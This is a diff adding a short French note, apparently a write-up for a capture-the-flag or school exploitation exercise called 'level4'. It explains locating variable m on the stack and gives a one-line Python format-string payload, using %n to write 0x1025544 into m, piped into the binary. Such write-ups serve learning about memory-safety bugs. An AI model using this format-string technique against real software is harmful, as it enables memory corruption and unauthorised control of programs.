@@ -1,0 +1,10 @@
+Ici, meme chose que sur l'exo precedent. 
+
+La diff est que le printf est appelée dans une autre fonction p
+
+On recherche l'addresse de m, et son emplacement dans la stack pour pouvoir fabriquer le payload
+
+Il faut attribuer a m 0x1025544. ou 16930116 en decimal.
+
+python -c 'print("\x10\x98\x04\x08" + "%16930112x" + "%12$n")' | ./level4
+
